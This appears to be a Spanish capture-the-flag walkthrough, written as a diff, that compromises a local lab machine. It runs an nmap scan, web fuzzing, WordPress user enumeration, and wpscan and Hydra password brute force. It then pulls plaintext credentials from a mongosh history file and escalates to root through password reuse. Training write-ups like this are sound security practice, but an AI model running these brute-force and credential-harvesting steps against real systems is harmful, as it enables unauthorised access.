@@ -1,0 +1,122 @@
+# Enumeracion de Puertos, Servicios y versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap
+
+Scanning 172.17.0.2 [65535 ports]
+Discovered open port 22/tcp on 172.17.0.2
+Discovered open port 80/tcp on 172.17.0.2
+Discovered open port 27017/tcp on 172.17.0.2
+
+
+# Revision del servicio web (puerto 80)
+
+nos conseguimos con la plantilla de apache, revisando el codigo fuente no conseguimos nada
+
+# Fuzzing Web
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://172.17.0.2' --hc 404
+
+conseguimos >>>>> wordpress
+
+chequeamos desde el navegador e inspeccionando el codigo fuente nos conseguimos con:
+
+<link rel="stylesheet" href="http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/style.css" type="text/css" media="screen" />
+<link rel="pingback" href="http://collections.dl/wordpress/xmlrpc.php" />
+
+asi que ahora agregamos collections.dl al archivo hosts
+
+172.17.0.2      collections.dl
+
+
+===============================================
+
+volvemos hacer fuzzing web contra wordpress
+
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://172.17.0.2/wordpress/FUZZ' --hc 404
+
+000000241:   301        9 L      28 W       323 Ch      "wp-content"                                                                                           
+000000786:   301        9 L      28 W       324 Ch      "wp-includes"                                                                                          
+000007180:   301        9 L      28 W       321 Ch      "wp-admin"
+
+
+ahora nos vamos a wp-admin que es el panel de login de wordpress...
+
+================================================
+
+# Escaneando Wordpress
+
+vamos a ver si podemos enumerar usuarios 
+
+wpscan --url http://172.17.0.2/wordpress/ -e u
+
+[i] User(s) Identified:
+[+] chocolate
+
+conseguimos un usuario y ahora podemos ver si conseguimos la clave haciendo fuerza bruta
+
+wpscan --url http://172.17.0.2/wordpress/ -U chocolate -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt -t 20
+
+[!] Valid Combinations Found:
+Username: chocolate, Password: chocolate
+
+logramos conseguir la password, nos logueamos y podemos observar la version que es: 6.5.3
+buscando un poco en la web vemos que es vulnerable pero no logro conseguir un exploit ...
+
+
+# ataque al servicio ssh que nos reporta nmap
+
+intentamos con el mismo usuario de Wordpress
+
+hydra -l chocolate -P /home/darks/Desktop/Kali/diccionarios/rockyou.txt ssh://172.17.0.2 
+
+[22][ssh] host: 172.17.0.2   login: chocolate   password: estrella
+
+ahora nos conectamos via ssh
+
+# Escalada de Privilegios
+
+sudo -l					| no se ejecuta
+find / -perm -4000 2>/dev/null		| no conseguimos nada
+ls -la					| listamos archivos ocultos
+
+==================
+-rw------- 1 chocolate chocolate    5 May 16 13:00 .bash_history
+-rw-r--r-- 1 chocolate chocolate  220 May 16 10:41 .bash_logout
+-rw-r--r-- 1 chocolate chocolate 3771 May 16 10:41 .bashrc
+drwx------ 2 chocolate chocolate 4096 May 16 11:44 .cache
+drwxrwxr-x 3 chocolate chocolate 4096 Aug 14 17:26 .local
+drwx------ 3 chocolate chocolate 4096 May 16 11:44 .mongodb
+-rw-r--r-- 1 chocolate chocolate  807 May 16 10:41 .profile
+==================
+
+cd .mongodb
+ls
+cd .mongosh/
+ls
+==================
+6645f1a68a091fae762202d7_log  config  mongosh_repl_history  snippets
+==================
+
+revisando toda la informacion conseguimos en el archivo >>> mongosh_repl_history:
+==================
+show dbs
+db.fsyncLock()
+db.usuarios.insert({"usuario": "dbadmin", "contraseña": "chocolaterequetebueno123"})
+use accesos
+==================
+
+vemos las credenciales del usuario dbadmin asi que escalamos 
+
+su dbadmin
+pass:chocolaterequetebueno123
+find / -perm -4000 2>/dev/null			| no conseguimos nada
+
+tras revisar diferentes directorios no conseguimos nada de lo que podamos aprovecharnos para escalar
+asi que intentamos con las 2 credenciales de los usuarios chocolate y dbadmin...
+el user root comparte la misma password que el usuario dbadmin
+
+su root
+pass: chocolaterequetebueno123
+
+whoami
+# root
